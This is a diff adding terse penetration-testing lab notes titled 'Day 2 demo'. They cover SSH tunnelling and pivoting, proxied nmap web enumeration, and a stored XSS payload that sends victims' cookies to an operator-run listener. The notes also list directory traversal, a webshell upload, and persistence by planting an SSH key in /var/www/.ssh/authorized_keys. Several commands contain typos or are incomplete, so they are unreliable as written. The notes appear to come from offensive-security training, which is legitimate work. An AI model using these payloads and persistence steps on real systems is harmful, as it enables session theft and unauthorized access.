@@ -1,0 +1,50 @@
+Day 2 demo
+
+#WEBEX1 
+  ssh -MS /tmp/demo demo@ip \
+    -L 8888:ip:port \
+    -L 2222:ip:port
+    -D 9050 
+
+  proxychains nmap -Pn -sT -p80 --script http-enum ip
+
+  ll /usr/share/nmap/scripts/*robots*
+/usr/share/scripts/http-robots.txt.nse
+
+  proxychains nmap -pn -sT -p80 --script http-robots.txt ip
+
+http://127.0.0.1:8888/robots.txt
+
+#JAVASCRIPT
+
+#XXS STORED
+  #START SERVER TO CATCH CALL 
+python3 -m http.server
+  #MALICIOUS JAVASCRIPT
+<script>document.location="http://opstation-ip:8000(or port specified)/?username=" + document.cookie;</script>
+
+  #BROWSE TO
+http://127.0.0.1:8888/chat/message.php
+
+  #DIRECTORY TRAVERSAL
+http://172.0.0.1:8888/path/pathdemo.php
+
+"bin/bash" could be fishy if found on account that shouldn't have login ability
+
+#FILE UPLOAD 
+  php 
+
+//upload the webshell
+
+#SSH KEY UPLOAD
+  ssh-keygen -t rsa -b port
+
+# ON TGT
+  mkdir /var/www/.ssh
+ls -latr /var/ww
+
+#PUT OUR KEY UP
+echo "<PUB_KEY>" >> /var/www/.ssh/authorized_keys
+
+# LOGIN WITH KEY
+  ssh -p 2222 www-data@127.0.0.1
